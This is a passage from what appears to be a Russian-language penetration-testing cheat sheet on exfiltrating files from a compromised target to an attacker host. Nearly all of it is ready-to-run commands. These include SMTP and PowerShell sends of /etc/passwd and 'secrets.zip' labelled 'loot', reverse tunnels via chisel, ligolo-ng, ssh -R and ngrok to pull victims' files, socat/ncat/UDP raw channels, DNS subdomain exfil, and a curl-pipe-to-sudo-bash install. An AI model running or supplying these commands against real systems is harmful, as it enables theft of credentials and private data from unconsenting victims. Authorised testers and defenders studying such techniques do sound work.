aiosmtpd -n -l 0.0.0.0:465 --smtpscert smtp-cert.pem --smtpskey smtp-key.pem
```

> С `--tlscert` aiosmtpd **требует** STARTTLS до `AUTH`/`MAIL`. Отключить - `--no-requiretls`.

### Отправка с Linux - SMTP / e-mail

**Наш перехватчик (`$LHOST`) - plain (25):**
```bash
swaks --to x@$LHOST --server $LHOST:25 --attach @/etc/passwd --body 'loot'
```

**Наш перехватчик - STARTTLS (587, самоподписанный серт):**
```bash
swaks --to x@$LHOST --server $LHOST:587 --tls --attach @/etc/passwd --body 'loot'
```

**Наш перехватчик - SMTPS (465, implicit TLS):**
```bash
python3 -c 'import smtplib,ssl,email.message as E; m=E.EmailMessage(); m["From"]="x@x"; m["To"]="you@example.com"; m["Subject"]="r"; m.set_content("loot"); m.add_attachment(open("/etc/passwd","rb").read(),maintype="application",subtype="octet-stream",filename="passwd"); s=smtplib.SMTP_SSL("'$LHOST'",465,context=ssl._create_unverified_context()); s.send_message(m)'
```

**Наш перехватчик - python3 + smtplib (25):**
```bash
python3 -c 'import smtplib,email.message as E; m=E.EmailMessage(); m["From"]="x@x"; m["To"]="you@example.com"; m["Subject"]="r"; m.set_content("loot"); m.add_attachment(open("/etc/passwd","rb").read(),maintype="application",subtype="octet-stream",filename="passwd"); s=smtplib.SMTP("'$LHOST'",25); s.send_message(m)'
```

**Внешний релей - swaks 587 (STARTTLS + auth):**
```bash
swaks --to you@example.com --from x@example.com --server smtp.example.com:587 --tls --auth LOGIN --auth-user user --auth-password 'pass' --attach @/etc/passwd --body 'loot'
```

**Внешний релей - curl SMTP + STARTTLS (587):**
```bash
curl --url "smtp://smtp.example.com:587" --ssl-reqd --user user:pass \
  --mail-from x@example.com --mail-rcpt you@example.com --upload-file /tmp/mail.txt
```

**Внешний релей - curl SMTPS (465):**
```bash
curl --url "smtps://smtp.example.com:465" --ssl-reqd --user user:pass \
  --mail-from x@example.com --mail-rcpt you@example.com --upload-file /tmp/mail.txt
```

**Внешний релей - python3 + smtplib STARTTLS (587):**
```bash
python3 -c 'import smtplib,email.message as E; m=E.EmailMessage(); m["From"]="x@x"; m["To"]="you@example.com"; m["Subject"]="r"; m.set_content("loot"); m.add_attachment(open("/etc/passwd","rb").read(),maintype="application",subtype="octet-stream",filename="passwd"); s=smtplib.SMTP("smtp.example.com",587); s.starttls(); s.login("user","pass"); s.send_message(m)'
```

**Внешний релей - python3 + smtplib SMTPS (465):**
```bash
python3 -c 'import smtplib,ssl,email.message as E; m=E.EmailMessage(); m["From"]="x@x"; m["To"]="you@example.com"; m["Subject"]="r"; m.set_content("loot"); m.add_attachment(open("/etc/passwd","rb").read(),maintype="application",subtype="octet-stream",filename="passwd"); s=smtplib.SMTP_SSL("smtp.example.com",465,context=ssl._create_unverified_context()); s.login("user","pass"); s.send_message(m)'
```

**Внешний релей - mailx:**
```bash
echo 'loot' | mailx -s 'report' -a /etc/passwd you@example.com
```

### Отправка с Windows - SMTP / e-mail

**Наш перехватчик (`$LHOST`) - plain (25), `Send-MailMessage`:**
```powershell
Send-MailMessage -To "x@$LHOST" -From "x@example.com" -Subject "report" -Body "loot" -Attachments "C:\Users\Public\secrets.zip" -SmtpServer $LHOST -Port 25
```

**Наш перехватчик - STARTTLS (587, самоподписанный серт):**
```powershell
[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
Send-MailMessage -To "x@$LHOST" -From "x@example.com" -Subject "report" -Body "loot" -Attachments "C:\Users\Public\secrets.zip" -SmtpServer $LHOST -Port 587 -UseSsl
```

**Наш перехватчик - .NET SmtpClient (25):**
```powershell
$m = New-Object Net.Mail.MailMessage("x@example.com","x@$LHOST","report","loot")
$m.Attachments.Add((New-Object Net.Mail.Attachment("C:\Users\Public\secrets.zip")))
(New-Object Net.Mail.SmtpClient($LHOST,25)).Send($m)
```

**Наш перехватчик - .NET SmtpClient STARTTLS (587):**
```powershell
$m = New-Object Net.Mail.MailMessage("x@example.com","x@$LHOST","report","loot")
$m.Attachments.Add((New-Object Net.Mail.Attachment("C:\Users\Public\secrets.zip")))
[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$c = New-Object Net.Mail.SmtpClient($LHOST,587); $c.EnableSsl=$true; $c.Send($m)
```

**Наш перехватчик - curl.exe SMTP + STARTTLS (587):**
```cmd
curl.exe --url "smtp://%LHOST%:587" --ssl-reqd --mail-from x@example.com --mail-rcpt you@example.com --upload-file C:\Users\Public\secrets.zip
```

**Наш перехватчик - curl.exe SMTPS (465):**
```cmd
curl.exe --url "smtps://%LHOST%:465" --ssl-reqd --mail-from x@example.com --mail-rcpt you@example.com --upload-file C:\Users\Public\secrets.zip
```

**Внешний релей - `Send-MailMessage` (STARTTLS, 587; в PS 5.1 есть, в PS7 устарел):**
```powershell
Send-MailMessage -To "you@example.com" -From "x@example.com" -Subject "report" -Body "loot" -Attachments "C:\Users\Public\secrets.zip" -SmtpServer "smtp.example.com" -Port 587 -UseSsl -Credential (Get-Credential)
```

**Внешний релей - .NET SmtpClient (STARTTLS, 587):**
```powershell
$m = New-Object Net.Mail.MailMessage("x@example.com","you@example.com","report","loot")
$m.Attachments.Add((New-Object Net.Mail.Attachment("C:\Users\Public\secrets.zip")))
$c = New-Object Net.Mail.SmtpClient("smtp.example.com",587); $c.EnableSsl=$true
$c.Credentials = New-Object Net.NetworkCredential("user","pass"); $c.Send($m)
```

> `Send-MailMessage -UseSsl` и `SmtpClient.EnableSsl` - это **STARTTLS** (587), а не SMTPS. Для 465 (implicit) на Windows бери `curl.exe --url smtps://` или python `SMTP_SSL`; самоподписанному серту - `ServerCertificateValidationCallback = {$true}`.

---

## 5. Реверс-туннели (цель стучится наружу)

Работает там, где **входящие** к цели закрыты, но она сама может открыть исходящее соединение. Цель поднимает туннель на LHOST, а мы через него тянем файлы.

### chisel - HTTP(S)-туннель (реверс)

**Установка (Linux/Windows):**
```bash
curl https://i.jpillora.com/chisel! | sudo bash
```

**LHOST - сервер с разрешённым реверсом:**
```bash
chisel server -p 8080 --reverse
```

**RHOST - открыть порт цели на LHOST (`R:2222:127.0.0.1:22` = LHOST:2222 → RHOST:22):**
```bash
chisel client http://$LHOST:8080 R:2222:127.0.0.1:22
```

**LHOST - забрать файл через туннель (scp поверх завернутого SSH):**
```bash
scp -P 2222 $RHOST_user@127.0.0.1:/home/victim/secrets.zip .
```

**Вариант проще: поднять на цели HTTP и завернуть его порт:**
```bash
# RHOST: раздаём каталог
python3 -m http.server 8081
# RHOST: завернуть 8081 цели на LHOST:8081
chisel client http://$LHOST:8080 R:8081:127.0.0.1:8081
# LHOST: тянем файл
curl -O http://127.0.0.1:8081/secrets.zip
```

**Реверс-SOCKS (для pivoting):**
```bash
# LHOST
chisel server -p 8080 --reverse
# RHOST - поднимает SOCKS на LHOST:1080, выход через сеть цели
chisel client http://$LHOST:8080 R:socks
# LHOST - ходим через него
proxychains curl http://<внутренний_хост>/loot
```

### ligolo-ng - реверс-туннель уровня IP

**LHOST - прокси (сгенерит серт и адрес):**
```bash
./ligolo-proxy -selfcert -laddr 0.0.0.0:11601
```

**RHOST - агент подключается к нам:**
```bash
./agent -connect $LHOST:11601 -ignore-cert
```

Дальше в консоли прокси: `session` → выбрать агента → `ifconfig` → создать интерфейс `ligolo` → `start`, и ходить по сети цели обычными средствами.

### ssh -R - если есть SSH-креды

**RHOST - реверс-проброс своего SSH на LHOST:2222:**
```bash
ssh -R 2222:127.0.0.1:22 $LHOST_user@$LHOST -N
```

**LHOST - забрать файл через проброс:**
```bash
scp -P 2222 $RHOST_user@127.0.0.1:/home/victim/secrets.zip .
```

### cloudflared / ngrok - выставить сервис цели наружу

**RHOST - поднять локальный HTTP-сервер:**
```bash
python3 -m http.server 8000
```

**RHOST - выставить его в интернет (получаем публичный URL):**
```bash
cloudflared tunnel --url http://localhost:8000
```

**ngrok - альтернатива:**
```bash
ngrok http 8000
```

**LHOST - забрать файл по выданному URL:**
```bash
curl -O https://<выданный-адрес>/secrets.zip
```

---

## 6. TLS и UDP - сырые каналы

Когда HTTP не нужен/не проходит, но открыт TLS-порт или UDP.

### TLS через socat

**LHOST - TLS-листенер, пишем в файл:**
```bash
socat OPENSSL-LISTEN:4443,cert=server.pem,verify=0,reuseaddr,fork OPEN:secrets.zip,creat,append
```

**RHOST (Linux) - отправить файл по TLS:**
```bash
socat -u FILE:secrets.zip OPENSSL:$LHOST:4443,verify=0
```

### TLS через ncat

**LHOST - TLS-листенер:**
```bash
ncat --ssl -lvnp 4443 > secrets.zip
```

**RHOST (Linux) - отправить:**
```bash
ncat --ssl $LHOST 4443 < secrets.zip
```

**RHOST (Windows) - ncat.exe:**
```cmd
ncat.exe --ssl %LHOST% 4443 < C:\Users\Public\secrets.zip
```

### openssl s_server / s_client

**LHOST - TLS-приёмник (нужны key/cert):**
```bash
openssl s_server -quiet -accept 4443 -key key.pem -cert cert.pem > secrets.zip
```

**RHOST - отправить файл:**
```bash
openssl s_client -quiet -connect $LHOST:4443 < secrets.zip
```

### UDP (когда TCP наружу зарезан)

**LHOST - UDP-приёмник:**
```bash
nc -u -lvnp 4444 > loot.bin
```

**RHOST (Linux) - /dev/udp, без утилит:**
```bash
cat loot.bin > /dev/udp/$LHOST/4444
```

> UDP без гарантий доставки - только для мелких файлов/строк. Большое сначала сжать ([10 - Encoding](10-encoding.md)).

---

## 7. Blind / OOB-эксфил (проверка «дошло» + крохи данных)

Когда нужно лишь подтвердить исходящий канал или вытащить чуть-чуть (идентификатор, хэш, короткую строку).

### interactsh - OOB-домен

**LHOST - поднять клиент (выдаст уникальный домен):**
```bash
interactsh-client
```

**RHOST - стукнуть наружу (видно на LHOST):**
```bash
nslookup test.<УНИКАЛЬНЫЙ_ДОМЕН>
```

**RHOST - протащить кусок данных в поддомене (base32, ≤63 симв./метка):**
```bash
curl -s "http://$(base64 -w0 loot.txt | head -c 60 | tr '+/' 'ab').<УНИКАЛЬНЫЙ_ДОМЕН>/"
```

### Burp Collaborator

Аналогично interactsh: сгенерируй Collaborator-домен в Burp и стучи на него (`nslookup`, `curl`). Полноценный DNS-эксфил - в [12 - DNS / ICMP](12-dns-icmp.md).

> Для файлов OOB не годится (слишком мало данных за запрос) - это для blind-подтверждения и мелких утечек.

---

## Проверка целостности (обязательно)

После любой передачи сверяем хэш на обоих концах - битый байт из-за текстового режима или обрыва канала не всегда заметен.

**Linux (и LHOST, и RHOST):**
```bash
sha256sum secrets.zip
```

**Windows (PowerShell):**
```powershell
Get-FileHash secrets.zip -Algorithm SHA256
```

**Windows (CMD):**
```cmd
certutil -hashfile secrets.zip SHA256
```

Хэши совпали → файл целый. Не совпали → гони в бинарном режиме или через [10 - Encoding](10-encoding.md). Больше диагностики - [14-troubleshooting.md](14-troubleshooting.md).

---

**См. также:** [01 - Attacker → Target](01-attacker-to-target.md) · [03 - SMB](03-smb.md) · [04 - WebDAV](04-webdav.md) · [07 - Netcat](07-netcat.md) · [10 - Encoding](10-encoding.md) · [11 - Encryption](11-encryption.md) · [12 - DNS / ICMP](12-dns-icmp.md)

---

## Формы переменных

**Linux (bash)**
```bash
export LHOST=192.168.2.5
export RHOST=192.168.10.20
# использование: $LHOST
```

**Windows (CMD)**
```cmd
set LHOST=192.168.2.5
set RHOST=192.168.10.20
:: использование: %LHOST%
```

**Windows (PowerShell)**
```powershell
$LHOST = "192.168.2.5"
$RHOST = "192.168.10.20"
# использование: $LHOST
```

Подробнее - [README](../../README_RU.md#обозначения-и-переменные).

---

[← Назад к справочнику](../../README_RU.md)
